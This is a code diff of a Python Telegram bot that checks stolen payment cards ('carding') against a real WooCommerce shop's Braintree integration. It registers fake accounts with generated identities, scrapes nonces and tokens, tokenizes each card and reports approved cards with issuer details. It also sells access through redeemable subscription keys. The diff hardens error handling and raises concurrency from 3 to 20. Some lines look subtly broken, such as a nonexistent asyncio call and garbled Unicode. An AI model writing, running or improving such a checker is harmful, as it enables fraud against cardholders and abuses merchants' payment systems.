@@ -53,7 +53,7 @@ bulk_progress = {}  # Track bulk check progress
 stop_checking = {}  # Track stop requests per user
 COOLDOWN_SECONDS = 70
 MAX_CONCURRENT_PER_USER = 3
-MAX_CONCURRENT_SINGLE = 3
+MAX_CONCURRENT_SINGLE = 20
 
 async def get_user(user_id):
     user = await users_collection.find_one({'user_id': user_id})
@@ -85,16 +85,23 @@ async def redeem_key(user_id, key):
     return None
 
 def generate_full_name():
-    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
-    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
+    first = ["Adam", "Ben", "Clara", "David", "Emma", "Fatima", "George", "Hannah"]
+    last = ["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Khan", "Patel"]
     return random.choice(first), random.choice(last)
 
 def generate_address():
-    cities = ["London", "Manchester"]
-    streets = ["Baker St", "Oxford St"]
-    zips = ["SW1A 1AA", "M1 1AE"]
-    city = random.choice(cities)
-    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)
+    cities = ["London", "Manchester", "Birmingham", "Leeds", "Glasgow"]
+    counties = ["Greater London", "Greater Manchester", "West Midlands", "West Yorkshire", "Glasgow City"]
+    streets = ["High Street", "Station Road", "Park Lane", "Church Street", "Victoria Road"]
+    postcodes = ["SW1A 1AA", "M1 1AE", "B1 1BB", "LS1 1UR", "G1 1DA"]
+    city_idx = random.randint(0, len(cities) - 1)
+    return (
+        cities[city_idx],                     # city
+        counties[city_idx],                   # state (county)
+        f"{random.randint(1, 999)} {streets[random.randint(0, len(streets) - 1)]}",  # street_address
+        postcodes[city_idx],                  # zip_code
+        f"Apt {random.randint(1, 100)}"       # address_2 (optional)
+    )
 
 def generate_email():
     return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"
@@ -103,10 +110,10 @@ def generate_username():
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
 
 def generate_phone():
-    return "303" + ''.join(random.choices(string.digits, k=7))
+    return "07" + ''.join(random.choices(string.digits, k=9))  # UK mobile format
 
 def generate_code(length=32):
-    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 async def get_bin_details(bin_number):
     try:
@@ -118,7 +125,7 @@ async def get_bin_details(bin_number):
                     card_type = data.get('brand', 'Unknown').capitalize()
                     card_level = data.get('level', 'Unknown')
                     card_type_category = data.get('type', 'Unknown')
-                    country_name = data.get('country_name', '')
+                    country_name = data.get('country_name', 'Unknown')
                     country_flag = data.get('country_flag', '')
                     return bank, card_type, card_level, card_type_category, country_name, country_flag
                 else:
@@ -151,7 +158,7 @@ async def check_cc(cc_details):
 
     start_time = time.time()
     first_name, last_name = generate_full_name()
-    city, state, street_address, zip_code = generate_address()
+    city, state, street_address, zip_code, address_2 = generate_address()
     acc = generate_email()
     username = generate_username()
     num = generate_phone()
@@ -167,44 +174,104 @@ async def check_cc(cc_details):
 
     try:
         async with aiohttp.ClientSession() as session:
+            # Register account
             async with session.get('https://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
-                reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)
+                reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text)
+                if not reg:
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to retrieve registration nonce',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
+                reg_nonce = reg.group(1)
 
             data = {
-                'username': username, 'email': acc, 'password': 'SandeshData@123',
-                'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
+                'username': username, 'email': acc, 'password': 'SandeshThePapa@123',
+                'woocommerce-register-nonce': reg_nonce, '_wp_http_referer': '/my-account/', 'register': 'Register'
             }
             async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
-                pass
+                if r.status != 200:
+                    logger.error(f"Account registration failed with status {r.status}")
 
+            # Update billing address
             async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
-                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)
+                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text)
+                if not address_nonce:
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to retrieve address nonce',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
+                address_nonce = address_nonce.group(1)
 
             data = {
-                'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
-                'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
-                'billing_phone': num, 'email': acc, 'save_address': 'Save address',
+                'billing_first_name': first_name,
+                'billing_last_name': last_name,
+                'billing_country': 'GB',
+                'billing_address_1': street_address,
+                'billing_address_2': address_2,
+                'billing_city': city,
+                'billing_state': state,
+                'billing_postcode': zip_code,
+                'billing_phone': num,
+                'billing_email': acc,
+                'save_address': 'Save address',
                 'woocommerce-edit-address-nonce': address_nonce,
-                '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
+                '_wp_http_referer': '/my-account/edit-address/billing/',
+                'action': 'edit_address'
             }
             async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
-                pass
+                if r.status != 200:
+                    logger.error(f"Address update failed with status {r.status}: {await r.text()}")
+                    return {
+                        'card': full, 'status': 'error', 'message': f'Address update failed: Status {r.status}',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
 
-            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxiesliks['http'] if proxies else None, ssl=False) as r:
+            # Add payment method
+            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 text = await r.text()
-                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
-                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)
+                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text)
+                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text)
+                if not (add_nonce and client_nonce):
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to retrieve payment nonce',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
+                add_nonce = add_nonce.group(1)
+                client_nonce = client_nonce.group(1)
 
             data = {
                 'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
             }
             async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                 token_resp = await r.json()
-                enc = token_resp['data']
+                enc = token_resp.get('data', '')
+                if not enc:
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to retrieve client token',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
                 dec = base64.b64decode(enc).decode('utf-8')
-                au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)
+                au = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
+                if not au:
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to extract authorization fingerprint',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
+                au = au.group(1)
 
             tokenize_headers = {
                 'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10', 'content-type': 'application/json',
@@ -217,7 +284,15 @@ async def check_cc(cc_details):
                 'operationName': 'TokenizeCreditCard'
             }
             async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
-                tok = (await r.json())['data']['tokenizeCreditCard']['token']
+                resp = await r.json()
+                tok = resp.get('data', {}).get('tokenizeCreditCard', {}).get('token', '')
+                if not tok:
+                    return {
+                        'card': full, 'status': 'error', 'message': 'Failed to tokenize credit card',
+                        'time_taken': time.time() - start_time, 'proxy_status': proxy_status, 'issuer': issuer,
+                        'card_type': card_type, 'card_level': card_level, 'card_type_category': card_type_category,
+                        'country_name': 'Unknown', 'country_flag': ''
+                    }
 
             headers.update({
                 'authority': 'www.bebebrands.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -352,7 +427,7 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
     if checking_msg:
         await checking_msg.delete()
 
-    card_info = f"{result['card_type']} - {result['card_level']} - {result['card_type_category']}"
+    card_info = f"{result['card_type']}+{result['card_level']}-{result['card_type_category']}"
     issuer = result['issuer']
     country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
     checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
@@ -361,8 +436,8 @@ async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
     if result['status'] == 'approved':
         msg = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
-               f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
-               f"[ϟ]�_R𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
+               f"[ϟ]�_G𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
+               f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
                f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
                f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
                f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
@@ -627,7 +702,7 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if result:
         tier, duration_days = result
         await update.message.reply_text(
-            f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 🎉\n\n𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐧𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration_days} days\n\n𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"
+            f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 🎉\n\n𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐧𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n𝐕𝐚𝐥.: {tier} {duration_days} days\n\n𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"
         )
     else:
         await update.message.reply_text("Invalid or already redeemed key.")
@@ -653,7 +728,7 @@ async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.message.from_user.id != OWNER_ID:
-        await update.message.reply_text("You are not authorized to use this command.")
+        await update.message.reply_text("Invalid command")
         return
 
     message = ' '.join(context.args)
@@ -676,8 +751,8 @@ def main():
     application.add_handler(CommandHandler("broadcast", broadcast))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     application.add_handler(CallbackQueryHandler(button_callback))
-    asyncio.ensure_future(process_single_checks())
-    asyncio.ensure_future(process_user_checks())
+    asyncio.ensure_task(process_single_checks())
+    asyncio.ensure_task(process_user_checks())
     application.run_polling()
 
 if __name__ == '__main__':
